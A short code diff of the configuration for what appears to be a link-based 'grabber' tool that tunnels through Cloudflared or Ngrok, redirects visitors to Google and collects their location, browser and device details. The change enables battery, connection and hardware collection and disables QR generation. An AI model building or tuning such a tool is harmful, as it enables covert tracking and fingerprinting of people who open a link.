@@ -37,7 +37,7 @@ CONFIG = {
     "dedup_window": 60,
     "redirect_url": "https://www.google.com",
     "tunnel_choice": 1,  # 1: Cloudflared, 2: Ngrok, 3: Localhost
-    "generate_qr": True,
+    "generate_qr": False,
     "ngrok_token": ""
 }
 
@@ -47,9 +47,9 @@ GRABBER_OPTIONS = {
     "geolocation": True,    # Desde server
     "user_agent": True,     # Headers
     "screen_platform": True,
-    "battery": False,
-    "connection": False,
-    "hardware": False       # RAM / Cores
+    "battery": True,
+    "connection": True,
+    "hardware": True       # RAM / Cores
 }
 
 # ─── Utilidades UI ──────────────────────────────────────────────────
